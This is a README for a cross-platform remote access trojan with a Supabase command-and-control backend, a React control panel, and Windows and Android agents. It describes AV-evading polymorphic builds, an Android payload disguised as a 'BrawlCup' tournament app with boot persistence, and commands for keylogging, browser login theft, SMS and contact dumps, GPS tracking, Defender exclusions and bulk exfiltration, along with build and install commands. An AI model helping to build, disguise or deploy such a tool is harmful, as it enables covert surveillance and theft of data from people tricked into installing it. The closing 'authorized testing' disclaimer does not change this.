# Val & Tine V2

Cross-platform remote administration tool with a React web dashboard, Supabase C2 backend, and agents for Windows and Android.

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   Dashboard   │────▶│   Supabase   │◀────│    Agent     │
│   (React)     │     │   (C2 API)   │     │  (Go binary) │
└──────────────┘     └──────────────┘     └──────────────┘
```

- **Windows Agent** — Go binary with polymorphic VM stager + dual-layer encryption
- **Android Agent** — Go binary packaged as `libagent.so` inside a signed APK (BrawlCup branding)
- **Dashboard** — React + Vite + Shadcn/UI web panel with real-time client management

---

## Quick Start

Three steps to get running:

### 1. Install Dependencies

```bash
npm install
```

This installs all Node.js packages needed for the React dashboard (Vite, React, Supabase client, Shadcn/UI, etc).

### 2. Run Setup

```bash
python3 setup.py
```

The setup wizard handles everything:

- **Checks system dependencies** — Go, Node.js, Java, Gradle, Android SDK (offers to auto-install missing ones)
- **Collects Supabase config** — project URL, anon key, optional secondary project for redundancy
- **Creates your dashboard login** — Supabase Auth user (email + password)
- **Configures Supabase CLI** — logs in, links your project, pushes DB migrations, deploys edge functions
- **Injects config** into agent source files and `.env`
- **Builds payloads** (optional) — Windows EXE and/or Android APK

> You can skip payload builds during setup and build them later. The dashboard works independently.

### 3. Launch the Dashboard

```bash
npm run dev
```

Open **http://localhost:5173** and log in with the credentials you created in step 2.

That's it. The dashboard is live and will show connected agents in real time.

---

## Building Payloads

Payloads can be built during `setup.py` or separately at any time.

### Windows

```bash
python3 obfus.py
```

Polymorphic pipeline — every build produces a unique binary:
1. Compile Go agent with injected C2 config
2. Dual-layer encrypt (XOR + RC4)
3. Generate randomized VM bytecode with unique opcodes
4. Compile polymorphic Go stager to EXE

To rebuild quickly:

```bash
python3 setup.py build
```

### Android (BrawlCup APK)

```bash
python3 build_android.py
```

Or with explicit config:

```bash
python3 build_android.py --domain yourproject.supabase.co --apikey eyJ...
```

| Flag | Default | Description |
|------|---------|-------------|
| `--domain` | from `.env` | Primary Supabase domain |
| `--domain2` | — | Secondary domain (redundancy) |
| `--apikey` | from `.env` | Supabase anon key |
| `--arch` | `arm64,arm` | Target architectures (comma-separated) |
| `--output` | `BrawlCup.apk` | Output filename |

The APK is branded as **BrawlCup** (tournament companion app) with:
- Trophy icon and purple/gold theme
- Full-screen permissions GUI explaining why each permission is needed
- Auto-starts background service after permission grant

Install on device:

```bash
adb install BrawlCup.apk
```

> Requires Android SDK with NDK. Set `ANDROID_HOME` or the builder auto-detects common paths.

---

## Agent Commands

### Cross-Platform (Windows + Android)

| Command | Description |
|---------|-------------|
| `ping` | Connection test |
| `shell` | Execute shell command |
| `sysinfo` | System information |
| `isadmin` | Check privileges |
| `screenshot` | Single screenshot |
| `screenshots` | Continuous screenshots (background) |
| `microphone` | Record audio |
| `wifi` | WiFi info and saved networks |
| `download` | Download file from target |
| `upload` | Upload file to target |
| `exfiltrate` | Bulk file exfiltration |
| `foldertree` | Directory listing |
| `persist` | Install persistence |
| `unpersist` | Remove persistence |
| `cleanup` | Clear traces |
| `sleep` | Sleep N seconds |
| `antianalysis` | VM/debugger detection report |
| `jobs` | List active background jobs |
| `kill` | Stop a background job |
| `pausejobs` | Stop all jobs |
| `resumejobs` | Resume default jobs |
| `options` | Show available commands |
| `exit` | Kill agent |

### Windows Only

| Command | Description |
|---------|-------------|
| `elevate` | UAC elevation |
| `excludec` | Defender exclusion for C:\\ |
| `excludeall` | Defender exclusions C:-G:\\ |
| `webcam` | Webcam capture |
| `keycapture` | Keylogger |
| `recordscreen` | Screen recording |
| `browserdb` | Exfiltrate browser databases |
| `parsebrowser` | Extract browser URLs/logins |
| `nearbywifi` | Scan nearby WiFi networks |
| `enumeratelan` | LAN discovery (ping sweep) |
| `message` | Show message box |
| `wallpaper` | Change wallpaper |
| `darkmode` / `lightmode` | Toggle system theme |
| `shortcutbomb` | Create desktop shortcuts |
| `fakeupdate` | Open fake update page |
| `soundspam` | Play system sounds |

### Android Only

| Command | Description |
|---------|-------------|
| `contacts` | Dump contacts |
| `sms_dump` | Dump SMS messages |
| `calllog` | Dump call log |
| `apps` | List installed apps |
| `location` | Last known location |
| `location_track` | Continuous GPS tracking |
| `clipboard` | Read clipboard |
| `camera` | Take photo |
| `toast` | Show toast message |
| `openurl` | Open URL in browser |
| `vibrate` | Vibrate device |

---

## Dashboard Features

- **Real-time client list** with online/idle/offline status indicators
- **Tabbed client view**: System Info, Remote Shell, Surveillance, File Manager, Exfiltration, Control
- **Remote shell** with terminal emulation and process manager
- **File browser** with upload/download
- **Surveillance**: screenshots, keylogger, audio recording, GPS tracking
- **Batch commands** — broadcast to multiple clients at once
- **Search and sorting** by status, machine name, OS, IP, admin level

---

## Project Structure

```
BrawlCup/
├── setup.py                 # Setup wizard (config + deps + Supabase + builds)
├── build_android.py         # Android APK builder
├── obfus.py                 # Windows polymorphic builder
├── main.go                  # Windows agent source
├── package.json             # Node.js dependencies
├── vite.config.ts           # Vite dev server config
├── .env                     # Supabase config (generated by setup.py)
│
├── src/                     # React dashboard
│   ├── App.tsx              # Router and auth guard
│   ├── pages/
│   │   ├── Login.tsx        # Auth form
│   │   ├── Dashboard.tsx    # Client list with real-time updates
│   │   └── ClientDetail.tsx # Client control panel (tabbed)
│   ├── components/
│   │   ├── layout/          # App shell, sidebar, navbar
│   │   └── client/          # Tab components (shell, files, surveillance, etc)
│   ├── hooks/               # Auth, clients, mobile hooks
│   └── lib/                 # Command dispatch, utilities
│
├── android/                 # Android APK project
│   ├── agent/main.go        # Android Go agent
│   ├── app/
│   │   ├── build.gradle     # App config (com.brawlcup.app)
│   │   └── src/main/
│   │       ├── AndroidManifest.xml
│   │       ├── res/         # BrawlCup icon, colors, strings
│   │       └── java/com/brawlcup/app/
│   │           ├── MainActivity.java   # Permissions GUI
│   │           ├── AgentService.java   # Foreground service
│   │           └── BootReceiver.java   # Boot persistence
│   ├── build.gradle
│   └── settings.gradle
│
└── supabase/                # Database & edge functions
    ├── migrations/
    │   ├── 01_schema.sql    # Tables: clients, commands, system_info, etc
    │   └── 02_storage.sql   # Storage buckets & policies
    └── functions/
        └── file-upload/     # File upload edge function
```

---

## Requirements

| Dependency | Version | Purpose |
|-----------|---------|---------|
| [Node.js](https://nodejs.org/) | 18+ | Dashboard + Supabase CLI |
| [Python](https://python.org/) | 3.8+ | Setup wizard and build scripts |
| [Go](https://go.dev/dl/) | 1.21+ | Agent compilation |

**Additional for Android builds:**

| Dependency | Purpose |
|-----------|---------|
| [Java JDK](https://adoptium.net/) 11+ | APK signing |
| [Gradle](https://gradle.org/install/) 8.x | APK build system |
| [Android SDK + NDK](https://developer.android.com/studio) | Build tools & cross-compilation |

> `setup.py` detects missing dependencies and can auto-install them via your system package manager (apt, dnf, pacman, brew, winget, choco).

---

## Disclaimer

This tool is provided for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.
